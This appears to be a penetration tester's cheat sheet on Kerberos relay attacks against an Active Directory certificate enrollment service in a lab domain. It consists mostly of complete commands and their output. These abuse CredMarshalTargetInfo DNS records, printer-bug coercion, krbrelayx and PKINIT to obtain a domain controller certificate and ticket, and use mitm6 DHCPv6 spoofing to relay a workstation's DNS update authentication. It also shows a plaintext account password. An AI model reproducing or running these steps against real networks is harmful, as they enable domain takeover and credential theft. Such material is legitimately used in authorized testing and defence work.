# Relay, Reflect

## KRB5

### relay by abusing the `CredMarshalTargetInfo()` function

```bash
dnstool -u 'sales.contoso.lab\intrasvc' -p '4dmD4v1D' \
-r 'win-srv011UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA' \
-d 192.168.1.145 --action add \
win-dc02.sales.contoso.lab
# [-] Connecting to host...
# [-] Binding to host
# [+] Bind OK
# [-] Adding new record
# [+] LDAP operation completed successfully

printerbug 'sales.contoso.org'/'intrasvc':'4dmD4v1D'@'win-dc02.sales.contoso.lab' 'win-srv011UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA'

python3 /usr/share/krbrelayx/krbrelayx.py \
--target http://win-srv01.sales.contoso.lab/certsrv/ \
-ip 192.168.1.145 \
--adcs --template DomainController
# ...
# [*] Setting up DNS Server
# [*] Servers started, waiting for connections
# [*] SMBD: Received connection from 192.168.1.12
# [*] HTTP server returned status code 200, treating as a successful login
# [*] SMBD: Received connection from 192.168.1.12
# [-] Unsupported MechType 'NTLMSSP - Microsoft NTLM Security Support Provider'
# [*] SMBD: Received connection from 192.168.1.12
# [-] Unsupported MechType 'NTLMSSP - Microsoft NTLM Security Support Provider'
# [*] Generating CSR...
# [*] CSR generated!
# [*] Getting certificate...
# [*] GOT CERTIFICATE! ID 22
# [*] Writing PKCS#12 certificate to ./unknown5766.pfx
# [*] Certificate successfully written to file

python3 PKINITtools/gettgtpkinit.py -cert-pfx ../unknown5766.pfx "sales.contoso.lab/win-dc02" win-dc02.ccache -dc-ip 192.168.1.12
# Loading certificate and key from file
# Requesting TGT
# AS-REP encryption key (you might need this later):
# Saved TGT to file

export KRB5CCNAME=win-dc02.ccache
```

### relay the `AP-REQ` from `DNS Authenticated Updates`

Scenario:

- `http://win-srv01.sales.contoso.lab/certsrv/` - ADCS web enrollment endpoint
- `Machine` - template we are getting a certificate as, all domain machines have an enrollment right to Machine template by default
- `desktop-mw01.sales.contoso.lab` - victim machine (that is going to be targeted by mitm6 (DHCPv6 spoofing)). It is set explicitly to avoid breaking the network. Since `mitm6` assigns a malicious IPv6 DNS server address to victim machines. `--host-allowlist` makes sure that this malicious DNS server will be assigned only to a `desktop-mw01.sales.contoso.lab` machine.
- `--interface-ip` tells krbrelayx which local IP to bind its incoming listeners to

fix the mitm6 2 NIC bug (force packets out the configured interface):

```bash
sudo python3 -c "
import re
p='/usr/lib/python3/dist-packages/mitm6/mitm6.py'
s=open(p).read()
s=re.sub(r'sendp\(resp, verbose=False\)',
        'sendp(resp, iface=config.default_if, verbose=False)', s)
open(p,'w').write(s)
"
grep -n 'sendp(resp' /usr/lib/python3/dist-packages/mitm6/mitm6.py
```

```bash
sudo mitm6 --domain sales.contoso.lab \
--host-allowlist desktop-mw01.sales.contoso.lab \
--relay win-srv01.sales.contoso.lab -i eth1
# Starting mitm6 using the following configuration:
# Primary adapter: eth1 [bc:24:11:50:07:dd]
# IPv4 address: 192.168.1.145
# IPv6 address: fe80::1d1b:b770:8684:1ab9
# DNS local search domain: sales.contoso.lab
# DNS allowlist: sales.contoso.lab
# Hostname allowlist: desktop-mw01.sales.contoso.lab
# IPv6 address fe80::192:168:1:200 is now assigned to mac=bc:24:11:4e:41:e6 host=DESKTOP-MW01.sales.contoso.lab. ipv4=192.168.1.200
# Sent SOA reply

python3 /usr/share/krbrelayx/krbrelayx.py \
    --target http://win-srv01.sales.contoso.lab/certsrv/ \
    -ip 192.168.1.145 \
    --victim desktop-mw01.sales.contoso.lab \
    --adcs --template Machine
# ...
# [*] Setting up DNS Server
# [*] Servers started, waiting for connections
# [*] DNS: Client sent authorization
# [*] HTTP server returned status code 200, treating as a successful login
# [*] Generating CSR...
# [*] CSR generated!
# [*] Getting certificate...
# [*] GOT CERTIFICATE! ID 17
# [*] Writing PKCS#12 certificate to ./desktop-mw01.sales.contoso.lab.pfx
# [*] Certificate successfully written to file
# [*] DNS: Client sent authorization
# [*] HTTP server returned status code 200, treating as a successful login
# [*] Skipping user desktop-mw01.sales.contoso.lab since attack was already performed
```
